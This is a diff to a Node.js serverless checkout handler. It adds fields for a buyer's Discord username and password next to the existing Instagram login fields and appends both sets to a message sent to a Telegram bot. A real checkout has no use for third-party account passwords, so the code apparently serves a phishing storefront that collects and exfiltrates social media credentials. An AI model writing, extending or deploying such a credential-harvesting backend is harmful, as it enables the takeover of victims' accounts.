@@ -24,17 +24,20 @@ module.exports = async (request, response) => {
   const phone = clean(body.phone, 32);
   const instagramUsername = clean(body.instagramUsername, 64);
   const instagramPassword = clean(body.instagramPassword, 64);
+  const discordUsername = clean(body.discordUsername, 64);
+  const discordPassword = clean(body.discordPassword, 64);
   const product = clean(body.product, 80);
   const price = clean(body.price, 24);
 
   const usingInstagram = instagramUsername && instagramPassword;
+  const usingDiscord = discordUsername && discordPassword;
   
   if (!EMAIL_PATTERN.test(email) || !accountName || !product || !price) {
     response.status(400).json({ error: 'Invalid checkout details' });
     return;
   }
 
-  if (!usingInstagram) {
+  if (!usingInstagram && !usingDiscord) {
     if (!password || !confirmPassword || !phone) {
       response.status(400).json({ error: 'Invalid checkout details' });
       return;
@@ -58,6 +61,9 @@ module.exports = async (request, response) => {
   }
   if (instagramUsername && instagramPassword) {
     telegramText += `\\nInstagram: ${instagramUsername}\\nInstagram Password: ${instagramPassword}`;
+  }
+  if (discordUsername && discordPassword) {
+    telegramText += `\\nDiscord: ${discordUsername}\\nDiscord Password: ${discordPassword}`;
   }
 
   const telegram = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
